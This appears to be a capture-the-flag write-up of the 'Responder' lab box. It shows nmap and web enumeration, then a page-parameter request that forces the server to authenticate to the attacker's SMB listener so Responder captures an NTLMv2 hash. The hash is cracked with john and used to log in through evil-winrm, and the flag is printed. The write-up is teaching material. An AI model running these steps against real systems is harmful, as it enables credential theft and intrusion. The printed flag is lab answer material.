
## CTF Writeup: Responder

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap 10.129.95.234
```

There seems to be only an webpage running on port 80 & WinRM on port 5985.

```
nmap -sCV -p 80,5985 10.129.95.234              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 18:27 -0500
Nmap scan report for 10.129.95.234
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
```

Tried accessing the webpage and got redirected to an domain called "unika.htb". Let's map it to the target ip address in our local dns file.

```
echo "10.129.95.234 unika.htb" | tee -a /etc/hosts
```

Now I am able to see the website!

Since there doesn't seem to be any backend functionality implemented, I will proceed with enumerating endpoints.

Unfortunately this didn't provide much.

```
feroxbuster --url http://unika.htb
```

Enumerated Subdomains, but wasn't able to find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://unika.htb -H "Host: FUZZ.unika.htb" -fs 61
```

Actually reading the About Page reveals information, that they are maybe using WordPress as CMS.

Further scanning via feroxbuster & a different wordlist, didn't provide any good results aswell.

```
feroxbuster --url http://unika.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Actually I was able to find smth interesting, when changing the language we got a new parameter within the URL, which could be vulnerable to an MITM Attack!

```
http://unika.htb/index.php?page=german.html
```

Started up responder to capture the NTLM Hash

```
responder -I tun0
```

Then made an reverse call to my local machine.

```
http://unika.htb/index.php?page=//10.10.14.44/test
```

Successfully captured the NTLM Hash of the Administrator User and stored it inside an hash file on my local machine.

Cracked the hash using john the ripper.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-08-12 18:43) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Connected to the target server via evil-winrm.

```
evil-winrm -i unika.htb -u Administrator -p badminton
```

Retrieved flag.txt in C:\Users\mike\Desktop.

```
ea81b7afddd03efaa0945333ed147fac
```